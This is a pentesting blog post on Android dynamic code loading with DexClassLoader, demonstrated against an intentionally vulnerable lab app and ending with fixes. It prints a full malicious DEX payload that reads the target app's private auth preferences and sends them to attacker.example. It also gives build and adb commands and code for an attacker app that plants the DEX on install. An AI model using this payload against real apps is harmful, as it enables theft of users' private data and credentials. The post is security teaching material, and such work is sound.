---
title: Android - Dynamic Code Loading via DexClassLoader
author: nirajkharel
date: 2026-06-13 14:30:00 +0800
categories: [Mobile Pentesting, Android]
tags: [Mobile Pentesting, Android, Dynamic Code Loading, RCE]
render_with_liquid: false
---


Apps that load code at runtime from outside the APK - via `DexClassLoader`, `PathClassLoader`, or `InMemoryDexClassLoader` - are common in plugin architectures, dynamic feature modules, and hot-patch frameworks. The bug class is when the loaded DEX comes from a path an attacker can write to. The attacker drops a malicious DEX there, the app loads it, and that DEX runs with the target app's UID and permissions.

<aside class="lab">
  <p><strong>Vulnerable demo</strong> · <a href="https://github.com/nirajkharel/VulnLabApp">VulnLabApp</a></p>
  <ul>
    <li><code>android/app/src/main/java/com/vulnlab/app/activities/DynamicCodeActivity.java</code></li>
  </ul>
</aside>

<br>**Where do you find it?**

```bash
grep -rn 'DexClassLoader\|PathClassLoader\|InMemoryDexClassLoader' decompile/
```

VulnLabApp's `DynamicCodeActivity` pre-fills the DEX path with `Environment.getExternalStorageDirectory() + "/plugin.dex"` and loads it on button tap.

<br>**What does this code do?**

```java
private String loadAndRunDex(String dexPath) {
    File dexFile = new File(dexPath);
    if (!dexFile.exists()) {
        return "DEX not found at: " + dexPath;
    }

    // VULN: loading from external storage — attacker-controlled path
    File optimizedDir = getDir("dex_opt", MODE_PRIVATE);
    Log.d(TAG, "[dynamic-code-loading] loading DEX: " + dexPath);

    try {
        DexClassLoader loader = new DexClassLoader(
            dexPath,
            optimizedDir.getAbsolutePath(),
            null,
            getClassLoader());

        // VULN: reflectively calls run() on the loaded class
        Class<?> pluginClass = loader.loadClass("com.vulnlab.plugin.Payload");
        Method runMethod = pluginClass.getMethod("run");
        Object instance = pluginClass.newInstance();
        Object result = runMethod.invoke(instance);
        Log.d(TAG, "[dynamic-code-loading] result: " + result);
        return "Loaded and executed. Result: " + result;
    } catch (Exception e) {
        Log.e(TAG, "[dynamic-code-loading] error", e);
        return "Error loading/executing: " + e.getMessage();
    }
}
```

The path comes from a user-editable field initialized to `/sdcard/plugin.dex`. External storage is writable by any app that holds `WRITE_EXTERNAL_STORAGE`, or on Android 10+ by any app that asks the user for scoped storage access to shared directories. Whatever DEX exists at that path gets loaded and its `run()` method is called inside the target's process.

Hook `DexClassLoader` to confirm at runtime:

```javascript
Java.perform(function () {
  const DCL = Java.use('dalvik.system.DexClassLoader');
  DCL.$init.implementation = function (dexPath, optDir, libPath, parent) {
    console.log('[DexClassLoader] ' + dexPath);
    return this.$init(dexPath, optDir, libPath, parent);
  };
});
```

Push a test DEX and trigger the activity:

```bash
adb push payload.dex /sdcard/plugin.dex
adb shell am start -n com.vulnlab.app/.activities.DynamicCodeActivity
```

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/dex-loader-1.png">

<br>**What does the malicious DEX contain?**

The attacker creates a class matching the name the target loads - here `com.vulnlab.plugin.Payload` with a `run()` method:

```java
package com.vulnlab.plugin;

import java.io.*;
import java.net.*;

public class Payload {
    public String run() {
        try {
            File f = new File("/data/data/com.vulnlab.app/shared_prefs/auth_prefs.xml");
            BufferedReader br = new BufferedReader(new FileReader(f));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line);
            br.close();
            final String data = sb.toString();

            // network call must be off the main thread on Android 4.0+
            new Thread(() -> {
                try {
                    new URL("https://attacker.example/?d=" +
                        URLEncoder.encode(data, "UTF-8")).openStream().close();
                } catch (Exception ignored) {}
            }).start();

            return "ok: " + data.substring(0, Math.min(80, data.length()));
        } catch (Exception e) {
            return "err: " + e.getClass().getSimpleName() + ": " + e.getMessage();
        }
    }
}
```

Compile and package. `d8` is in the Android SDK build-tools, not on `$PATH`:

```bash
mkdir -p com/vulnlab/plugin
# save Payload.java at com/vulnlab/plugin/Payload.java
javac --release 8 com/vulnlab/plugin/Payload.java
D8=$(ls ~/Library/Android/sdk/build-tools/*/d8 | sort -V | tail -1)
$D8 com/vulnlab/plugin/Payload.class --output . --min-api 27
mv classes.dex plugin.dex
adb push plugin.dex /sdcard/plugin.dex
```
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/dex-loader-2.png">
The attacker app writes this to `/sdcard/plugin.dex` then waits. Next time the user opens `DynamicCodeActivity`, the DEX loads and `run()` executes inside the target's process - reading private files, accessing databases, or using the target's session credentials.

What does the attacker app's install step look like?

```java
// attacker app — plant the DEX on install or first launch
try (InputStream in = getAssets().open("malicious.dex");
     OutputStream out = new FileOutputStream(new File("/sdcard/plugin.dex"))) {
    byte[] buf = new byte[8192];
    int n;
    while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
} catch (IOException ignored) {}
```

`DynamicCodeActivity` is not exported, so the attacker cannot fire it remotely. The attack relies on the user navigating there themselves.

<br>**What does the remote-download variant look like?**

Some apps download the DEX rather than reading it from storage:

```java
URL u = new URL("http://updates.target.com/plugins/feature.dex");   // HTTP
InputStream in = u.openStream();
File local = new File(getCacheDir(), "feature.dex");
copy(in, new FileOutputStream(local));
new DexClassLoader(local.getPath(), ...).loadClass("...").newInstance();
```

Three failure modes here:

**HTTP without TLS.** A network attacker swaps the DEX in transit. Wider reach than the external-storage case since no app install is required.

**HTTPS with broken hostname verification.** Same network swap. See the hostname-verifier bypass post.

**HTTPS with valid TLS but no DEX signature check.** Even with a pinned cert, the app verifies the transport, not the payload. A compromised CDN delivers a malicious DEX that the app loads without further checks.

The real mitigation for the remote case is signing the DEX with the developer's private key and verifying that signature inside the app before calling `DexClassLoader`.

<br>**What is the fix?**

Load code only from the app's internal directories and verify its integrity before loading:

```java
// Good — internal dir, not reachable by other apps
File trustedPath = new File(getFilesDir(), "plugins/feature.dex");
// Also verify DEX signature before loading
verifyDexSignature(trustedPath);
new DexClassLoader(trustedPath.getAbsolutePath(), ...);
```

For apps that must support plugins, load only from paths the app itself wrote after cryptographic verification, never from external storage or untrusted network locations.

<br>**Closing**

Dynamic code loading is the bug class that turns another app's write primitive into code execution inside the target's process. The audit step is one grep for `DexClassLoader`, then follow the path argument. Any external-storage or untrusted-download path is the bug. The DEX runs with the target's identity, its permissions, and access to its private data directory.

Happy Hacking !!
